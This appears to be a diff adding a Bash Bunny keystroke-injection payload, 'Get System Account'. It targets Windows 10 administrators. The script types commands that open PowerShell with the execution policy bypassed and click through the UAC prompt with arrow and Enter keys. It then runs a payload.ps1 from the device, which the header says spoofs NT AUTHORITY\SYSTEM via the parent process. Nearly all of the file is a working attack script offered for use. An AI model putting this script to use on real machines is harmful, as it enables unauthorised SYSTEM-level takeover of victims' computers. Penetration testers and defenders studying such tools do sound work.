@@ -1,0 +1,78 @@
+#!/bin/bash
+#
+# Title:            Get System Account
+#
+# Description:      Spoofing "NT AUTHORITY\SYSTEM" via parent process using PowerShell and embedded C Sharp
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         Execution
+# Target:           Microsoft Windows 10
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 Family Version 1903 (PowerShell 5.1)
+# Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
+#
+# REQUIREMENTS
+# ===============
+# The target user must belong to the 'Administrator' group.
+# The target user have 'SeDebugPrivilege' token in 'Administrator' mode (by default).
+#
+# TOOLS
+# ===============
+# https://github.com/decoder-it/psgetsystem
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q GUI r
+Q DELAY 5000
+Q STRING "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 1500
+Q CTRL-SHIFT ENTER
+Q DELAY 5000
+Q LEFTARROW
+Q DELAY 3000
+Q ENTER
+Q DELAY 7000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 2000
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING ".\payload.ps1"
+Q ENTER
+
+######## FINISH ########
+
+LED FINISH
